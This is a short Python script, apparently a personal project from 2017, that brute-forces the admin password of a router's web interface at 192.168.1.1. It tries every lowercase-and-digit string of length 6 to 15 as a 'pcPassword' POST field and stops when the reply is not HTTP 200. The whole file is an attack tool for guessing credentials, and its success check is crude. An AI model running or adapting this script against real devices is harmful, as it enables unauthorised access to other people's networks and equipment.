'''
Created on 2017年9月30日

@author: zheng
'''
import requests
import string
from Tools.MySpider import MySpider
import itertools as its

class WifiManagePassSpider(MySpider):
    def __init__(self):
        self.start_url = "http://192.168.1.1/"
        
    def tryPass(self):
        words = string.ascii_lowercase + "1234567890"
        for n in range(6, 16):
            r = its.product(words, repeat=n)
            for i in r:
                i = "".join(i)
                self.postdata = {
                "pcPassword":i,
                }
                print(i)
                page = requests.post(self.start_url, data=self.postdata)
#                 page = requests.get(self.start_url)
#                 print(page)
                if page.status_code != 200:
                    return

if __name__ == "__main__":
    t = WifiManagePassSpider()
    t.tryPass()
